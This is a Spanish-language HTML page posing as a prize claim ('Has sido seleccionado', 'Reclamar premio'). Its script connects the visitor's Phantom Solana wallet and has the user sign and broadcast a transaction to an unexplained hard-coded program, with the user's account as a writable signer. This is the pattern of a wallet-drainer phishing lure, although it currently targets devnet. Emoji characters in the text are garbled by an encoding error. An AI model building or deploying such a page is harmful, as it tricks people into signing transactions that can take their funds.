<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>üéÅ Recompensa Especial</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: sans-serif;
      background: #0d1117;
      color: #ffffff;
      text-align: center;
      padding: 40px;
    }
    .card {
      background: #161b22;
      padding: 30px;
      border-radius: 15px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
    }
    button {
      background: #1abc9c;
      border: none;
      padding: 15px 30px;
      color: #fff;
      font-size: 18px;
      border-radius: 10px;
      cursor: pointer;
      margin-top: 20px;
    }
    button:hover {
      background: #16a085;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>üéâ Has sido seleccionado</h1>
    <p>¬°Reclama tu recompensa exclusiva ahora!</p>
    <button id="connectBtn">Reclamar premio</button>
  </div>

  <script src="https://unpkg.com/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
  <script>
    const connectBtn = document.getElementById("connectBtn");

    connectBtn.addEventListener("click", async () => {
      try {
        const provider = window.phantom?.solana || window.solana;
        if (!provider?.isPhantom) {
          alert("‚ùå Phantom Wallet no est√° disponible.");
          return;
        }

        await provider.connect();

        const connection = new solanaWeb3.Connection("https://api.devnet.solana.com", "confirmed");

        const PROGRAM_ID = new solanaWeb3.PublicKey("ChzBcsMoHq4SPyTA17gT65GYc8H4D5n3pVWJoYFCYQN8");
        const PDA = new solanaWeb3.PublicKey("F8VPnwLH1BGyHUrY877iHXDPbWCXSLDLwtrSxVMYuQWm");

        const accounts = [
          { pubkey: provider.publicKey, isSigner: true, isWritable: true },
          { pubkey: PDA, isSigner: false, isWritable: true },
        ];

        const instruction = new solanaWeb3.TransactionInstruction({
          keys: accounts,
          programId: PROGRAM_ID,
          data: new Uint8Array([]),
        });

        const { blockhash } = await connection.getLatestBlockhash();
        const transaction = new solanaWeb3.Transaction({
          recentBlockhash: blockhash,
          feePayer: provider.publicKey,
        }).add(instruction);

        const signed = await provider.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction(signature);

        alert("‚úÖ Transacci√≥n enviada con √©xito: " + signature);
      } catch (err) {
        alert("‚ùå Error: " + err.message);
        console.error(err);
      }
    });
  </script>
</body>
</html>
